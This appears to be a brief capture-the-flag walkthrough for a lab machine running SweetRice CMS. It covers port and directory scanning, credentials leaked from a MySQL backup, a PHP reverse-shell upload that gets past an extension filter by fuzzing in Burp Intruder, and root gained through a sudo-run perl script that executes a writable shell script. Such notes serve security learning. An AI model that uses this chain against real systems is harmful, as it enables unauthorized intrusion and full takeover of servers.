nmap 
22 ssh 
80 http

dirsearch 	-> /content: sweet rice (cms)
			-> /index.html -> 1st place 

dirb 
/content/as : login site
/content/images: upload container (img)
/content/inc: upload container(php)
		lastest.txt: 1.5.1 (sweetrice version)
		mysql_backup: backup file (disclosure exploit)
			found in mysql file: manager:	Password123

		use burpsuite to upload php-rev-shell to media center
		send to intruder 
		in positions, change filename="§php-reverse-shell.php§" to "filename="php-reverse-shell.§php§"
		add payloads: php1, php2, php3, ....

log in as www-data
can sudo usr/bin/perl /home/itguy/backup.pl 
cat backup.pl ->  !/usr/bin/perl

system("sh", "/etc/copy.sh");

copy bash rev code to copy.sh
open a port to listen
run as sudo usr/bin/perl /home/itguy/backup.pl 
-> root access



